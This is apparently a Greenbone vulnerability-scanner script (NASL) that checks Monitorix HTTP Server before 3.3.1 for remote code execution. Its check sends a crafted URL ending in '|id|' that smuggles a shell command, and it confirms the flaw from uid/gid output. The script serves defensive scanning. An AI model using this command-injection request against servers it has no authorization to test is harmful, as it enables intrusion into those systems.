# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103855");
  script_version("2023-07-14T16:09:26+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Monitorix HTTP Server Remote Code Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.monitorix.org/news.html#N331");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63913");
  script_tag(name:"last_modification", value:"2023-07-14 16:09:26 +0000 (Fri, 14 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-12-12 14:22:20 +0100 (Thu, 12 Dec 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl");
  script_mandatory_keys("Monitorix/banner");
  script_require_ports("Services/www", 8080);

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary commands
  in the context of the affected server.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"The handle_request() routine did not properly perform input sanitization
  which led into a number of security vulnerabilities.");

  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Monitorix HTTP Server Remote Code Execution Vulnerability");
  script_tag(name:"affected", value:"Monitorix < 3.3.1");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:8080 );
banner = http_get_remote_headers( port:port );
if( ! banner || "Monitorix" >!< banner ) exit( 0 );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  url = dir + '|id|';
  if( ret = http_vuln_check( port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+.*" ) ) {
    report = 'It was possible to execute the "id" command on the remote host.\n\n' +
             'By requesting the URL "' + url + '" we received the following response:' +
             '\n\n' + ret + '\n';
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
